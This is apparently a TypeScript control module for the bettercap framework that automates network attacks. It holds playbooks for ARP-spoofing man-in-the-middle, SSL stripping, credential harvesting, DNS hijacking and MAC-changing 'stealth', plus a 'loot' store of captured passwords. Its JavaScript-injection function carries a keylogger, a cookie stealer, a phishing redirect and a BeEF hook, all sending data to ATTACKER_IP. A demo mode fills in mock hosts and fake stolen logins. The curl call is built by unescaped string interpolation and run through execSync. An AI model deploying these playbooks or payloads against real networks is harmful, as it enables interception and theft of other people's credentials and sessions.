import { execSync } from "child_process";

const BETTERCAP_API_HOST = process.env.BETTERCAP_HOST || "127.0.0.1";
const BETTERCAP_API_PORT = process.env.BETTERCAP_PORT || "8025";
const BETTERCAP_USER = process.env.BETTERCAP_USER || "admin";
const BETTERCAP_PASS = process.env.BETTERCAP_PASS || "admin";
const DEMO_MODE = process.env.DEMO_MODE !== "false";

type ApiResult = { success: boolean; data: unknown; error?: string };

// =============================================
//  DEMO MODE - بيانات وهمية للتجربة
// =============================================
const moduleStates: Record<string, boolean> = {
  "net.recon": true, "net.probe": false, "net.sniff": false,
  "arp.spoof": false, "http.proxy": false, "https.proxy": false,
  "dns.spoof": false, "dhcp6.spoof": false, "wifi.recon": false,
  "wifi.deauth": false, "ble.recon": false, "syn.scan": false,
  "tcp.proxy": false, "mac.changer": false, "ticker": true,
};

const demoSettings: Record<string, string> = {
  "arp.spoof.targets": "",
  "arp.spoof.fullduplex": "false",
  "arp.spoof.internal": "false",
  "http.proxy.sslstrip": "false",
  "http.proxy.injectjs": "",
  "http.proxy.script": "",
  "dns.spoof.domains": "*",
  "dns.spoof.address": "",
  "dns.spoof.all": "false",
  "net.sniff.verbose": "false",
  "net.sniff.local": "false",
  "net.sniff.filter": "",
  "net.sniff.regexp": "",
  "wifi.recon.channel": "",
  "ticker.commands": "net.show",
  "ticker.period": "1",
};

const mockHosts = [
  { ipv4: "192.168.1.1", mac: "00:11:22:33:44:55", hostname: "router.local", vendor: "TP-Link", meta: { sent: 1024000, recv: 2048000 } },
  { ipv4: "192.168.1.100", mac: "aa:bb:cc:11:22:33", hostname: "iPhone-Ahmed", vendor: "Apple Inc.", meta: { sent: 512000, recv: 768000 } },
  { ipv4: "192.168.1.101", mac: "dd:ee:ff:44:55:66", hostname: "Galaxy-S24", vendor: "Samsung Electronics", meta: { sent: 256000, recv: 384000 } },
  { ipv4: "192.168.1.102", mac: "11:22:33:aa:bb:cc", hostname: "DESKTOP-PC01", vendor: "Dell Inc.", meta: { sent: 128000, recv: 192000 } },
  { ipv4: "192.168.1.103", mac: "fe:dc:ba:98:76:54", hostname: "MacBook-Pro", vendor: "Apple Inc.", meta: { sent: 2048000, recv: 4096000 } },
  { ipv4: "192.168.1.104", mac: "ab:cd:ef:12:34:56", hostname: "smart-tv", vendor: "LG Electronics", meta: { sent: 64000, recv: 512000 } },
  { ipv4: "192.168.1.105", mac: "99:88:77:66:55:44", hostname: "Ring-Doorbell", vendor: "Amazon Technologies", meta: { sent: 32000, recv: 96000 } },
];

let mockEvents: Array<{ tag: string; time: string; data: Record<string, unknown> }> = [
  { tag: "endpoint.new", time: new Date(Date.now() - 120000).toISOString(), data: { ipv4: "192.168.1.100", mac: "aa:bb:cc:11:22:33", vendor: "Apple Inc." } },
  { tag: "net.sniff.http.request", time: new Date(Date.now() - 90000).toISOString(), data: { from: "192.168.1.100", to: "93.184.216.34", url: "http://example.com/login", method: "POST" } },
  { tag: "net.sniff.credentials", time: new Date(Date.now() - 60000).toISOString(), data: { from: "192.168.1.101", to: "login.example.com", username: "ahmed@test.com", password: "P@ss123!", protocol: "http" } },
  { tag: "net.sniff.dns", time: new Date(Date.now() - 45000).toISOString(), data: { from: "192.168.1.102", query: "www.google.com", answers: ["142.250.185.68"] } },
  { tag: "net.sniff.dns", time: new Date(Date.now() - 30000).toISOString(), data: { from: "192.168.1.103", query: "api.instagram.com", answers: ["157.240.1.174"] } },
  { tag: "endpoint.new", time: new Date(Date.now() - 15000).toISOString(), data: { ipv4: "192.168.1.105", mac: "99:88:77:66:55:44", vendor: "Amazon Technologies" } },
  { tag: "net.sniff.http.request", time: new Date(Date.now() - 5000).toISOString(), data: { from: "192.168.1.102", to: "54.230.10.100", url: "http://updates.example.com/check", method: "GET" } },
];

let mockLoot: Array<{ victimIp: string; website: string; username: string; password: string; protocol: string; time: string }> = [
  { victimIp: "192.168.1.101", website: "login.example.com", username: "ahmed@test.com", password: "P@ss123!", protocol: "HTTP", time: new Date(Date.now() - 60000).toISOString() },
];

// =============================================
//  CORE API
// =============================================
export function callBettercapApi(endpoint: string, method: "GET" | "POST" = "GET", data?: string): ApiResult {
  if (DEMO_MODE) return handleDemoMode(endpoint, method, data);
  try {
    const url = `http://${BETTERCAP_API_HOST}:${BETTERCAP_API_PORT}${endpoint}`;
    const auth = `${BETTERCAP_USER}:${BETTERCAP_PASS}`;
    let curlCmd = `curl -s -u "${auth}" -X ${method}`;
    if (method === "POST" && data) curlCmd += ` -H "Content-Type: application/json" -d '${data}'`;
    curlCmd += ` "${url}"`;
    const result = execSync(curlCmd, { timeout: 10000, encoding: "utf-8", env: { ...process.env, NO_PROXY: "127.0.0.1,localhost" } });
    if (!result || result.trim() === "") return { success: false, data: null, error: "Empty response" };
    try { return { success: true, data: JSON.parse(result) }; } catch { return { success: true, data: result }; }
  } catch (error) {
    return { success: false, data: null, error: error instanceof Error ? error.message : "Unknown error" };
  }
}

export function sendCommand(command: string): ApiResult {
  if (DEMO_MODE) return handleDemoCommand(command);
  return callBettercapApi("/api/session", "POST", JSON.stringify({ cmd: command }));
}

export function getSession(): ApiResult { return callBettercapApi("/api/session", "GET"); }
export function getEvents(): ApiResult { return callBettercapApi("/api/events", "GET"); }

// =============================================
//  MODULE OPERATIONS
// =============================================
export function toggleModule(moduleName: string, state: boolean): ApiResult {
  return sendCommand(`${moduleName} ${state ? "on" : "off"}`);
}

export function startRecon(): ApiResult {
  sendCommand("net.recon on");
  return sendCommand("net.probe on");
}

export function stopAll(): ApiResult {
  const mods = ["arp.spoof", "net.sniff", "http.proxy", "https.proxy", "dns.spoof", "dhcp6.spoof", "wifi.recon", "wifi.deauth", "ble.recon", "syn.scan", "tcp.proxy", "net.probe", "net.recon", "ticker"];
  for (const mod of mods) sendCommand(`${mod} off`);
  return { success: true, data: { message: "All modules stopped" } };
}

export function clearEvents(): ApiResult { return sendCommand("events.clear"); }

// =============================================
//  SMART SET COMMANDS - أوامر Set الذكية
// =============================================

/** حقن JavaScript ذكي */
export function smartInjectJs(payload: string, customUrl?: string): ApiResult {
  const payloads: Record<string, string> = {
    keylogger: `<script>document.addEventListener('keypress',function(e){new Image().src='http://ATTACKER_IP:8080/k?'+e.key});</script>`,
    fake_login: `<script>alert('Session expired. Please login again.');window.location='http://ATTACKER_IP:8080/phish';</script>`,
    cookie_stealer: `<script>new Image().src='http://ATTACKER_IP:8080/c?'+document.cookie;</script>`,
    redirect: `<script>window.location='http://ATTACKER_IP:8080/evil';</script>`,
    beef_hook: `<script src="http://ATTACKER_IP:3000/hook.js"></script>`,
    screenshot: `<script>setTimeout(function(){var c=document.createElement('canvas');var ctx=c.getContext('2d');c.width=window.innerWidth;c.height=window.innerHeight;},3000);</script>`,
  };
  const jsCode = customUrl || payloads[payload] || payload;
  sendCommand(`set http.proxy.injectjs ${jsCode}`);
  sendCommand("http.proxy on");
  return { success: true, data: { message: `JS injection active: ${payload}`, code: jsCode } };
}

/** تزييف DNS ذكي مع جدول قواعد */
export function smartDnsSpoof(rules: Array<{ domain: string; ip: string }>): ApiResult {
  const domains = rules.map(r => r.domain).join(",");
  const ip = rules[0]?.ip || "127.0.0.1";
  sendCommand(`set dns.spoof.domains ${domains}`);
  sendCommand(`set dns.spoof.address ${ip}`);
  sendCommand("set dns.spoof.all true");
  sendCommand("dns.spoof on");
  return { success: true, data: { message: `DNS spoofing ${rules.length} domains`, rules } };
}

/** فلترة التنصت الذكية */
export function smartSniffFilter(options: {
  credentialsOnly?: boolean;
  httpOnly?: boolean;
  dnsOnly?: boolean;
  ignoreLocal?: boolean;
  customFilter?: string;
  targetIp?: string;
}): ApiResult {
  if (options.ignoreLocal) sendCommand("set net.sniff.local false");
  else sendCommand("set net.sniff.local true");
  sendCommand("set net.sniff.verbose true");
  if (options.credentialsOnly) {
    sendCommand("set net.sniff.regexp (?i)(user|pass|login|email|token|auth|cookie|session)");
  }
  if (options.httpOnly) {
    sendCommand("set net.sniff.filter tcp port 80 or tcp port 8080");
  } else if (options.dnsOnly) {
    sendCommand("set net.sniff.filter udp port 53");
  } else if (options.targetIp) {
    sendCommand(`set net.sniff.filter host ${options.targetIp}`);
  } else if (options.customFilter) {
    sendCommand(`set net.sniff.filter ${options.customFilter}`);
  }
  sendCommand("net.sniff on");
  return { success: true, data: { message: "Sniffer configured & started", options } };
}

/** استهداف ذكي */
export function smartTarget(targets: string[], fullDuplex: boolean = true): ApiResult {
  sendCommand(`set arp.spoof.targets ${targets.join(",")}`);
  sendCommand(`set arp.spoof.fullduplex ${fullDuplex}`);
  sendCommand("set arp.spoof.internal true");
  return { success: true, data: { message: `Targets set: ${targets.join(",")}`, targets } };
}

// =============================================
//  ATTACK PLAYBOOKS - سيناريوهات الهجوم
// =============================================

/** سيناريو: حصد كلمات المرور */
export function playbookCredentialHarvest(targets: string[]): ApiResult {
  if (targets.length > 0) sendCommand(`set arp.spoof.targets ${targets.join(",")}`);
  sendCommand("set arp.spoof.fullduplex true");
  sendCommand("set arp.spoof.internal true");
  sendCommand("set net.sniff.verbose true");
  sendCommand("set net.sniff.regexp (?i)(user|pass|login|email|token|session|cookie|auth|pwd|credential)");
  sendCommand("set http.proxy.sslstrip true");
  sendCommand("net.recon on");
  sendCommand("arp.spoof on");
  sendCommand("net.sniff on");
  sendCommand("http.proxy on");
  return { success: true, data: { message: "Credential harvester active" } };
}

/** سيناريو: MITM الكامل */
export function playbookFullMitm(targets: string[]): ApiResult {
  if (targets.length > 0) sendCommand(`set arp.spoof.targets ${targets.join(",")}`);
  sendCommand("set arp.spoof.fullduplex true");
  sendCommand("set arp.spoof.internal true");
  sendCommand("set http.proxy.sslstrip true");
  sendCommand("set net.sniff.verbose true");
  sendCommand("set net.sniff.local true");
  sendCommand("net.recon on");
  sendCommand("net.probe on");
  sendCommand("arp.spoof on");
  sendCommand("net.sniff on");
  sendCommand("http.proxy on");
  return { success: true, data: { message: "Full MITM chain active" } };
}

/** سيناريو: وضع الشبح */
export function playbookStealth(): ApiResult {
  sendCommand("mac.changer on");
  sendCommand("set net.sniff.local false");
  sendCommand("set net.sniff.verbose false");
  sendCommand("net.recon on");
  return { success: true, data: { message: "Stealth mode active (passive recon + MAC changed)" } };
}

/** سيناريو: DNS Hijack */
export function playbookDnsHijack(targets: string[], domain: string, redirectIp: string): ApiResult {
  if (targets.length > 0) sendCommand(`set arp.spoof.targets ${targets.join(",")}`);
  sendCommand("set arp.spoof.fullduplex true");
  sendCommand(`set dns.spoof.domains ${domain}`);
  sendCommand(`set dns.spoof.address ${redirectIp}`);
  sendCommand("set dns.spoof.all true");
  sendCommand("net.recon on");
  sendCommand("arp.spoof on");
  sendCommand("dns.spoof on");
  return { success: true, data: { message: `DNS hijack: ${domain} -> ${redirectIp}` } };
}

/** سيناريو: اعتراض شامل */
export function playbookFullInterception(targets: string[]): ApiResult {
  if (targets.length > 0) sendCommand(`set arp.spoof.targets ${targets.join(",")}`);
  sendCommand("set arp.spoof.fullduplex true");
  sendCommand("set arp.spoof.internal true");
  sendCommand("set http.proxy.sslstrip true");
  sendCommand("set net.sniff.verbose true");
  sendCommand("set net.sniff.local true");
  sendCommand("set dns.spoof.all true");
  sendCommand("net.recon on");
  sendCommand("net.probe on");
  sendCommand("arp.spoof on");
  sendCommand("net.sniff on");
  sendCommand("http.proxy on");
  sendCommand("dns.spoof on");
  return { success: true, data: { message: "Full interception active (ARP+HTTP+DNS+Sniff)" } };
}

/** الحصول على خزنة كلمات المرور (Demo) */
export function getLoot(): ApiResult {
  return { success: true, data: { loot: mockLoot } };
}

// =============================================
//  DEMO MODE HANDLERS
// =============================================
function handleDemoMode(endpoint: string, method: string, data?: string): ApiResult {
  if (endpoint === "/api/session" && method === "GET") {
    return {
      success: true,
      data: {
        interface: { name: "wlan0", ipv4: "192.168.1.37", mac: "aa:bb:cc:dd:ee:ff" },
        gateway: { ipv4: "192.168.1.1", mac: "00:11:22:33:44:55" },
        lan: { hosts: mockHosts },
        modules: Object.entries(moduleStates).map(([name, running]) => ({ name, running })),
        started_at: new Date(Date.now() - 3600000).toISOString(),
      },
    };
  }
  if (endpoint === "/api/session" && method === "POST" && data) {
    const parsed = JSON.parse(data);
    return handleDemoCommand(parsed.cmd);
  }
  if (endpoint === "/api/events") return { success: true, data: { events: mockEvents } };
  return { success: true, data: {} };
}

function handleDemoCommand(command: string): ApiResult {
  const cmd = command.toLowerCase().trim();

  // Module toggle
  const modMatch = cmd.match(/^([\w.]+)\s+(on|off)$/);
  if (modMatch) {
    const [, modName, state] = modMatch;
    if (modName in moduleStates) {
      moduleStates[modName] = state === "on";
      mockEvents.unshift({ tag: "sys.log", time: new Date().toISOString(), data: { message: `${modName} ${state === "on" ? "started" : "stopped"}` } });
      // If arp.spoof turned on, simulate credential capture after a delay
      if (modName === "arp.spoof" && state === "on") {
        setTimeout(() => {
          mockEvents.unshift({
            tag: "net.sniff.credentials",
            time: new Date().toISOString(),
            data: { from: "192.168.1.103", to: "mail.example.com", username: "user@mail.com", password: "secret456", protocol: "SMTP" },
          });
          mockLoot.push({ victimIp: "192.168.1.103", website: "mail.example.com", username: "user@mail.com", password: "secret456", protocol: "SMTP", time: new Date().toISOString() });
        }, 5000);
      }
      return { success: true, data: { output: `${modName} ${state}` } };
    }
  }

  // Set commands
  if (cmd.startsWith("set ")) {
    const parts = cmd.substring(4).split(/\s+/);
    if (parts.length >= 2) {
      demoSettings[parts[0]] = parts.slice(1).join(" ");
    }
    return { success: true, data: { output: `OK: ${command}` } };
  }

  // Get commands
  if (cmd.startsWith("get ")) {
    const key = cmd.substring(4).trim();
    if (key === "*") {
      const all = Object.entries(demoSettings).map(([k, v]) => `${k} = ${v || "(empty)"}`).join("\n");
      return { success: true, data: { output: all } };
    }
    return { success: true, data: { output: `${key} = ${demoSettings[key] || "(not set)"}` } };
  }

  if (cmd === "net.show") {
    const out = mockHosts.map(h => `${h.ipv4}\t${h.mac}\t${h.hostname}\t${h.vendor}`).join("\n");
    return { success: true, data: { output: out } };
  }

  if (cmd === "events.clear") {
    mockEvents = [];
    return { success: true, data: { output: "Events cleared" } };
  }

  if (cmd === "help") {
    return { success: true, data: { output: "net.recon on/off | net.probe on/off | arp.spoof on/off | http.proxy on/off | dns.spoof on/off | net.show | events.clear | set <p> <v> | get <p>" } };
  }

  return { success: true, data: { output: `Executed: ${command}` } };
}
